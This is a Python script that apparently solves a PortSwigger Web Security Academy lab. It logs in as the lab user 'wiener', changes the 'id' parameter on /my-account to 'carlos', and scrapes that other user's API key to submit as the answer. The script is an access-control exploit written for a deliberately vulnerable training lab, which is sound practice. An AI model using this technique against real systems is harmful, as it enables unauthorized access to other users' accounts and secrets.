from web_security_academy.core.logger import logger
from urllib.parse import urlencode, urljoin
from bs4 import BeautifulSoup

import requests
import re


def solve_lab(session):
    csrf = session.get_csrf_token("/login")

    username, password = "wiener", "peter"
    data = {"csrf": csrf, "username": username, "password": password}
    logger.info(f'Logging in with the credentials "{username}:{password}"')
    resp = session.post_path("/login", data=data)

    soup = BeautifulSoup(resp.text, "lxml")
    invalid_creds = soup.find(text="Invalid username or password.")
    if invalid_creds:
        logger.failure("Invalid credentials.")
        return
    else:
        logger.success("Successfully logged in.")

    url = urljoin(session.url, "/my-account")
    params = {"id": "carlos"}
    logger.info(f'Visiting "{url}?{urlencode(params)}"...')
    resp = session.get_path("/my-account", params=params)

    soup = BeautifulSoup(resp.text, "lxml")
    regex = re.compile(r"Your API Key is: (.*)")
    match = soup.find(text=regex)

    if match is None:
        logger.failure("Unable to extract API key from HTTP response.")
    else:
        api_key = re.match(regex, match).group(1)
        logger.success(f"API Key: {api_key}")
        session.submit_solution(api_key)
